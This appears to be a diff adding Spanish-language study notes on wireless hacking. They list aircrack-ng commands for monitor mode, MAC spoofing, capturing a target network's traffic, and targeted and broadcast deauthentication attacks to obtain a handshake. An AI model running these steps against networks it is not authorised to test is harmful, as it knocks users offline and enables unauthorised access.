@@ -1,0 +1,74 @@
+\ESTE VA A SER UN RESUMEN DE HACKING A REDES INALAMBRICAS!
+
+
+
+--------------------------------///////\\\\\\\--------------------------------------
+
+
+como ver si puedo poner mi tarjeta en modo monitor:
+
+	airmon-ng start wlp4s0 
+
+	ifconfig wlp4s0mon up
+
+hay que frenar procesos:
+
+	killall dhclient wpa_supplicant
+
+o bien:
+
+	airmon-ng check kill
+
+
+
+
+para frenar el modo monitor:
+
+	airmon-ng stop wlp4s0mon
+
+volvemos a activar los procesos previamente matados:
+	
+	/etc/init.d/networking restart
+
+
+
+Falsificar direccion mac:
+
+	macchanger -s wlp4s0mon
+
+	macchanger -l | grep -i "lo que quiera"
+
+	macchanger --mac=00:20:91:da:af:8d wlp4s0mon (aca nos estamos poniendo la mac de
+	la NATIONAL SECURITY AGENCY)
+
+cabe aclarar que para cambiarnos la direccion mac hay que dar de baja la interfaz
+del ifconfig:
+
+	ifconfig wlp4s0mon down
+
+cambiamos toda la mac y:
+
+	ifconfig wlp4s0mon up
+
+
+// ANALISIS DE ENTORNO
+
+	airodump-ng wlp4s0mon (filtramos solo por una red)
+
+	airodump-ng -c <canal-que-quiera> -w captura --essid <nombre> wlp4s0mon 
+
+nos interesa el archivo captura-01.cap
+
+
+
+// GENERAR HANDSHAKE DE UN CLIENTE (desconectarlo de la red)
+
+ataque de desautenticacion dirigido (a una persona):
+	
+	aireplay-ng -0 10 -a <mac del wifi> -c <mac del usuario a echar> wlp4s0mon
+
+ataque de desautenticacion global (a toda la red):
+
+	aireplay-ng -0 10 -a <mac del wifi> -c FF:FF:FF:FF:FF:FF wlp4s0mon
+
+	
